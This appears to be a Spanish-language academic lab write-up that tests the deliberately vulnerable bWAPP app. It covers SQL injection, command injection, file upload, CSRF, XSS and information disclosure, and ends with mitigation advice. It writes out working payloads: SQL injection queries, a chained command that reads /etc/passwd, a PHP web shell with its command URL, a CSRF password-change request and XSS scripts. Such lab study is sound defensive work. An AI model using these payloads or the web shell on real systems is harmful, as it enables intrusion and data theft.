---
layout: post
title: bWAPP Web Vulnerability Assessment & Defensive Analysis
date: 2026-06-13 17:00:00 +0200
categories: [academico, cybersecurity, web-security]
tags: [academic, writeup, owasp, sql-injection, xss, csrf]
---

# 🛡️ bWAPP Web Vulnerability Assessment & Defensive Analysis

| Campo                          | Descripción                                                                                                 |
| :----------------------------- | :---------------------------------------------------------------------------------------------------------- |
| **Tecnologías / Herramientas** | bWAPP, Bee-Box, PHP, MySQL, Burp Suite / Navegador Web, Linux                                               |
| **Tags / Keywords**            | #BlueTeam #WebSecurity #OWASP #SQLInjection #XSS #CSRF #CommandInjection #FileUpload #InformationDisclosure |
| **Categorías**                 | Análisis de Amenazas / Seguridad Web / Hacking Ético                                                        |
| **Autor**                      | Kevin López Granado                                                                                         |

---

## bWAPP Web Vulnerability Assessment & Defensive Analysis - [ACADEMIC / LAB - Beginner]

### 🎯 Objetivo

El objetivo de esta actividad es realizar un análisis técnico de vulnerabilidades web en un entorno académico controlado basado en **bWAPP**, identificando fallos comunes asociados al **OWASP Top 10** y evaluando su impacto desde una perspectiva defensiva.

Durante el laboratorio se analizan vulnerabilidades como **SQL Injection**, **Blind SQL Injection**, **OS Command Injection**, **Unrestricted File Upload**, **Cross-Site Request Forgery**, **Broken Authentication**, **Cross-Site Scripting** e **Information Disclosure**. El propósito principal no es únicamente ejecutar los vectores de ataque, sino comprender cómo se producen, qué impacto tendrían en un entorno real y qué controles de seguridad deberían implementarse para mitigarlos.

### 🛠️ Prerrequisitos

Para replicar el laboratorio son necesarios los siguientes elementos:

* Entorno vulnerable **bWAPP / Bee-Box** desplegado en máquina virtual.
* Navegador web para interactuar con la aplicación.
* Acceso autenticado a bWAPP con usuario de laboratorio.
* Conectividad HTTP hacia el servidor vulnerable.
* Nivel de seguridad de bWAPP configurado en modo vulnerable o bajo.
* Conocimientos básicos de:
  * HTTP GET/POST.
  * SQL.
  * PHP.
  * Linux.
  * Vulnerabilidades web comunes.
* Entorno aislado de laboratorio, sin exposición a Internet ni sistemas productivos.

### 🚀 Ejecución

#### 1. Identificación de SQL Injection en búsqueda GET

Se analiza la funcionalidad **SQL Injection (GET/Search)** de bWAPP, donde el parámetro de búsqueda introducido por el usuario es concatenado directamente en una consulta SQL sin validación adecuada ni uso de consultas preparadas.

El objetivo es comprobar si es posible modificar la consulta original mediante un payload de tipo `UNION SELECT`.

Payload utilizado para enumerar tablas de la base de datos:

```sql
undefined' UNION SELECT 
NULL,table_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.tables 
WHERE table_schema=database()-- -
```

Este payload permite consultar la tabla `information_schema.tables` y obtener nombres de tablas pertenecientes a la base de datos actual.

![Resultado consulta SQL Inyection tablas](/assets/img/posts/web-vuln-assessment/web-1.png)*Figura 1: Resultado consulta SQL Inyection tablas*

Posteriormente, se realiza una enumeración de columnas de la tabla `users`:

```sql
undefined' UNION SELECT 
NULL,column_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.columns 
WHERE table_name='users'-- -
```

Con esta técnica se confirma que la aplicación permite extraer metadatos internos de la base de datos, como nombres de tablas y columnas, lo que compromete directamente la **confidencialidad** de la información.

![Resultado consulta SQL Inyection campos users](/assets/img/posts/web-vuln-assessment/web-2.png)*Figura 2: Resultado consulta SQL Inyection campos users*

#### 2. Explotación de SQL Injection Blind Boolean-Based

Se analiza la funcionalidad **SQL Injection Blind Boolean-Based**, donde la aplicación no devuelve directamente los datos consultados, pero sí modifica su respuesta en función de si una condición SQL es verdadera o falsa.

Se valida el nombre de la base de datos mediante una condición booleana:

```sql
undefined' OR (SELECT database()='bWAPP') AND '1'='1
```

Si la condición es verdadera, la aplicación responde indicando que la película existe. Si la condición es falsa, devuelve un mensaje indicando que no existe.

![Resultado SQL Inyection detección nombre BBDD](/assets/img/posts/web-vuln-assessment/web-3.png)*Figura 3: Resultado SQL Inyection detección nombre BBDD*

También se realiza una prueba de inferencia carácter a carácter:

```sql
Iron Man' AND substring((SELECT distinct(table_schema) 
FROM information_schema.tables 
LIMIT 1,1),1,1)='b' ##
```

Este comportamiento permite reconstruir progresivamente nombres de esquemas, tablas, columnas o incluso valores sensibles, aunque la aplicación no muestre directamente el resultado de la consulta.

![Resultado consulta SQL Inyection detección valores correctos BBDD (I)](/assets/img/posts/web-vuln-assessment/web-4.png)*Figura 4: Resultado consulta SQL Inyection detección valores correctos BBDD (I)*
![Resultado consulta SQL Inyection detección valores correctos BBDD (II)](/assets/img/posts/web-vuln-assessment/web-5.png)*Figura 5: Resultado consulta SQL Inyection detección valores correctos BBDD (II)*
![Resultado consulta SQL Inyection detección valores incorrectos BBDD (I)](/assets/img/posts/web-vuln-assessment/web-6.png)*Figura 6: Resultado consulta SQL Inyection detección valores incorrectos BBDD (I)*
![Resultado consulta SQL Inyection detección valores incorrectos BBDD (II)](/assets/img/posts/web-vuln-assessment/web-7.png)*Figura 7: Resultado consulta SQL Inyection detección valores incorrectos BBDD (II)*

#### 3. Prueba de OS Command Injection en DNS Lookup

Se analiza la funcionalidad **OS Command Injection**, concretamente el módulo de búsqueda DNS. La aplicación concatena directamente el dominio introducido por el usuario dentro de un comando del sistema operativo.

Payload utilizado:

```bash
google.com; cat /etc/passwd
```

![Consulta OS Command Inyection BBDD (I)](/assets/img/posts/web-vuln-assessment/web-8.png)*Figura 8: Consulta OS Command Inyection BBDD*
![ Resultado consulta OS Command Inyection BBDD](/assets/img/posts/web-vuln-assessment/web-9.png)*Figura 9: Resultado consulta OS Command Inyection BBDD*

El carácter `;` permite encadenar un segundo comando después de la consulta DNS original. En este caso, se intenta leer el archivo `/etc/passwd`, demostrando que la aplicación ejecuta comandos arbitrarios en el sistema operativo.

Este fallo es crítico desde el punto de vista defensivo, ya que puede derivar en:

* Lectura de archivos sensibles.
* Enumeración del sistema.
* Ejecución remota de comandos.
* Instalación de backdoors.
* Movimiento lateral dentro de la infraestructura.

#### 4. Validación de Unrestricted File Upload

Se analiza la funcionalidad **Unrestricted File Upload**, donde la aplicación permite subir archivos sin validar correctamente su extensión, tipo MIME o contenido.

Se crea un archivo PHP con capacidad de ejecutar comandos recibidos mediante el parámetro `cmd`:

```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

El archivo se sube al servidor aprovechando la ausencia de controles adecuados sobre el tipo de fichero.

![Subida archivo PHP al servidor (I)](/assets/img/posts/web-vuln-assessment/web-11.png)*Figura 10: Subida archivo PHP al servidor (I)*
![Subida archivo PHP al servidor (II)](/assets/img/posts/web-vuln-assessment/web-12.png)*Figura 11: Subida archivo PHP al servidor (II)*

Una vez almacenado, se accede a la ruta del archivo subido y se ejecutan comandos mediante la URL:

```text
http://<servidor>/bWAPP/images/shell.php?cmd=cat /etc/passwd
```

La correcta ejecución del comando confirma que el servidor permite ejecutar código PHP subido por el usuario, lo que puede derivar en **Remote Code Execution**.

![Resultado Unrestricted File Upload](/assets/img/posts/web-vuln-assessment/web-13.png)*Figura 12: Resultado Unrestricted File Upload*

#### 5. Análisis de Cross-Site Request Forgery en cambio de contraseña

Se analiza la funcionalidad **Cross-Site Request Forgery (Change Password)**. La aplicación permite cambiar la contraseña del usuario autenticado mediante una petición HTTP GET, sin token anti-CSRF ni validación del origen de la petición.

Ejemplo de estructura vulnerable:

```text
/bWAPP/csrf_1.php?password_new=pwned123&password_conf=pwned123&action=change
```

![Análisis vulnerabilidad CSRF](/assets/img/posts/web-vuln-assessment/web-14.png)*Figura 13: Análisis vulnerabilidad CSRF*

El problema principal es que la acción sensible depende únicamente de la sesión activa del usuario. Si la víctima está autenticada y accede a una URL maliciosa, la aplicación procesa el cambio de contraseña sin requerir confirmación adicional.

![Modificación contraseña usuario con sesión activa](/assets/img/posts/web-vuln-assessment/web-15.png)*Figura 14:  Modificación contraseña usuario con sesión activa*

Este comportamiento puede provocar la toma de control de la cuenta de la víctima.

![Resultado vulnerabilidad CSRF e Insecure Login Forms](/assets/img/posts/web-vuln-assessment/web-16.png)*Figura 15: Resultado vulnerabilidad CSRF e Insecure Login Forms*

#### 6. Revisión de Broken Authentication en formulario de login

Durante la revisión del formulario de autenticación se identifica un fallo de **Broken Authentication**, ya que las credenciales válidas aparecen embebidas en el código fuente HTML con estilo oculto.

Este tipo de exposición supone una mala práctica crítica, ya que cualquier usuario con acceso al código fuente de la página puede descubrir credenciales válidas o información sensible relacionada con el proceso de autenticación.

La autenticación debe implementarse siempre en el lado del servidor, evitando exponer usuarios, contraseñas, pistas o mecanismos de validación dentro del cliente.

#### 7. Explotación de Cross-Site Scripting Reflected GET

Se analiza la vulnerabilidad **Cross-Site Scripting Reflected (GET)**, donde la aplicación refleja valores introducidos por el usuario en la respuesta HTML sin aplicar sanitización ni codificación de salida.

Payload utilizado:

```html
<script>alert("XSS")</script>
```

Al introducir el payload en el formulario vulnerable, el navegador interpreta la etiqueta `<script>` como código JavaScript válido y ejecuta la alerta.

![Resultado formulario vulnerable con código JavaScript (XSS)](/assets/img/posts/web-vuln-assessment/web-18.png)*Figura 16: Resultado formulario vulnerable con código JavaScript (XSS)*

Este comportamiento confirma que la aplicación permite la ejecución de JavaScript arbitrario en el contexto del navegador de la víctima.

#### 8. Explotación de Cross-Site Scripting Stored Blog

Se analiza la vulnerabilidad **Cross-Site Scripting Stored (Blog)**. A diferencia del XSS reflejado, en este caso el payload queda almacenado en la base de datos y se ejecuta cada vez que un usuario accede a la página afectada.

Payload utilizado:

```html
<script>alert("XSS Stored")</script>
```

![Almacenamiento código JavaScript con persistencia incluso recargando (XSS)](/assets/img/posts/web-vuln-assessment/web-19.png)*Figura 17: Almacenamiento código JavaScript con persistencia incluso recargando (XSS)*

Al publicar el comentario malicioso en el blog, la aplicación lo almacena sin sanitización. Posteriormente, cada vez que se carga la página, el navegador ejecuta el código JavaScript almacenado.

![Resultado código JavaScript con persistencia incluso recargando (XSS)](/assets/img/posts/web-vuln-assessment/web-20.png)*Figura 18: Resultado código JavaScript con persistencia incluso recargando (XSS)*

Este tipo de XSS es especialmente relevante desde una perspectiva defensiva porque afecta potencialmente a todos los usuarios que visiten la sección comprometida.

#### 9. Análisis de Information Disclosure - PHP Version

Se analiza la exposición de información técnica del servidor mediante la funcionalidad **Information Disclosure - PHP Version**.

La aplicación muestra información detallada sobre la versión de PHP utilizada por el servidor. Aunque este fallo no implica una explotación directa, proporciona información útil para un atacante durante la fase de reconocimiento.

![Resultado vulnerabilidad Information Disclosure (PHP Version)](/assets/img/posts/web-vuln-assessment/web-21.png)*Figura 19: Resultado vulnerabilidad Information Disclosure (PHP Version)*

Conocer la versión exacta de PHP permite buscar vulnerabilidades públicas, exploits conocidos o configuraciones inseguras asociadas a esa versión.

#### 10. Análisis de Information Disclosure - robots.txt

Se analiza el archivo `robots.txt`, donde se identifican rutas internas no visibles directamente desde la navegación principal.

Ejemplo de rutas expuestas:

```text
Disallow: /admin/
Disallow: /documents/
Disallow: /images/
Disallow: /passwords/
```

![Resultado vulnerabilidad Information Disclosure (robots.txt)](/assets/img/posts/web-vuln-assessment/web-22.png)*Figura 20: Resultado vulnerabilidad Information Disclosure (robots.txt)*

Aunque `robots.txt` no representa por sí mismo un control de seguridad, la exposición de rutas sensibles puede facilitar la enumeración de recursos internos y servir como punto de partida para ataques posteriores.

### 🧪 Validación (Proof of Concept)

La validación del laboratorio se realiza mediante la ejecución controlada de payloads y la observación de respuestas anómalas en la aplicación vulnerable.

#### SQL Injection - Enumeración de tablas

Payload:

```sql
undefined' UNION SELECT 
NULL,table_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.tables 
WHERE table_schema=database()-- -
```

Resultado esperado:

```text
La aplicación devuelve nombres de tablas internas de la base de datos,
confirmando la exposición de metadatos mediante SQL Injection.
```

#### SQL Injection - Enumeración de columnas

Payload:

```sql
undefined' UNION SELECT 
NULL,column_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.columns 
WHERE table_name='users'-- -
```

Resultado esperado:

```text
La aplicación devuelve columnas de la tabla users, como login, password,
email u otros campos internos.
```

#### Blind SQL Injection - Condición booleana verdadera

Payload:

```sql
undefined' OR (SELECT database()='bWAPP') AND '1'='1
```

Resultado esperado:

```text
La aplicación responde indicando que el recurso existe,
confirmando que la condición SQL evaluada es verdadera.
```

#### Blind SQL Injection - Inferencia carácter a carácter

Payload:

```sql
Iron Man' AND substring((SELECT distinct(table_schema) 
FROM information_schema.tables 
LIMIT 1,1),1,1)='b' ##
```

Resultado esperado:

```text
Si el carácter evaluado coincide, la aplicación devuelve una respuesta positiva.
Si no coincide, devuelve una respuesta negativa.
```

#### OS Command Injection

Payload:

```bash
google.com; cat /etc/passwd
```

Resultado esperado:

```text
La respuesta HTTP incluye contenido del archivo /etc/passwd,
demostrando ejecución de comandos en el sistema operativo.
```

#### Unrestricted File Upload

Webshell de prueba:

```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

Ejecución:

```text
http://<servidor>/bWAPP/images/shell.php?cmd=cat /etc/passwd
```

Resultado esperado:

```text
El navegador muestra la salida del comando ejecutado en el servidor.
```

#### CSRF - Cambio de contraseña

Petición maliciosa:

```text
http://<servidor>/bWAPP/csrf_1.php?password_new=pwned123&password_conf=pwned123&action=change
```

Resultado esperado:

```text
La contraseña del usuario autenticado se modifica sin validación adicional
ni token anti-CSRF.
```

#### XSS Reflected

Payload:

```html
<script>alert("XSS")</script>
```

Resultado esperado:

```text
El navegador ejecuta JavaScript y muestra una ventana emergente.
```

#### XSS Stored

Payload:

```html
<script>alert("XSS Stored")</script>
```

Resultado esperado:

```text
El payload queda almacenado en el blog y se ejecuta automáticamente
cada vez que se carga la página afectada.
```

#### Information Disclosure

Validaciones realizadas:

```text
Acceso a página con información de versión PHP.
Acceso a /robots.txt para identificar rutas internas expuestas.
```

Resultado esperado:

```text
La aplicación revela información técnica del entorno y rutas internas
útiles para fases posteriores de reconocimiento.
```

### 📝 Resumen

En esta actividad se ha realizado una evaluación técnica de vulnerabilidades web sobre un entorno académico bWAPP, identificando fallos críticos y moderados que afectan a la confidencialidad, integridad y disponibilidad del sistema. Se han validado vectores de ataque como SQL Injection, Blind SQL Injection, OS Command Injection, Unrestricted File Upload, CSRF, Broken Authentication, XSS Reflected, XSS Stored e Information Disclosure. Desde una perspectiva Blue Team, el laboratorio permite comprender cómo se materializan estos fallos, qué evidencias generan y qué controles defensivos deben priorizarse para reducir la superficie de ataque en aplicaciones web.

### 💡 Conclusiones

* **Defensa en Profundidad:** La actividad demuestra que una aplicación vulnerable puede ser comprometida mediante múltiples vectores encadenables. Un atacante podría comenzar con Information Disclosure, continuar con SQL Injection o File Upload y terminar obteniendo ejecución remota de comandos. Por ello, la seguridad no debe depender de un único control, sino de validación de entrada, codificación de salida, control de sesiones, hardening del servidor, segmentación y monitorización continua.

* **Optimización y Rendimiento:** El uso de consultas preparadas, validaciones estrictas y controles centralizados de seguridad reduce el riesgo sin introducir una carga operativa elevada. La correcta gestión de errores, logs y cabeceras de seguridad permite mejorar la visibilidad defensiva y facilita la detección temprana de comportamientos anómalos, como payloads SQL, comandos encadenados o scripts inyectados.

* **Mitigación / Buenas Prácticas:** Para mitigar los riesgos identificados se recomienda implementar prepared statements frente a SQL Injection, listas blancas de entrada frente a Command Injection, validación estricta de ficheros subidos, almacenamiento fuera del webroot, tokens anti-CSRF, cookies con atributos `HttpOnly`, `Secure` y `SameSite`, codificación de salida para prevenir XSS, eliminación de credenciales en cliente y reducción de información técnica expuesta en respuestas HTTP, páginas de error y archivos públicos como `robots.txt`.
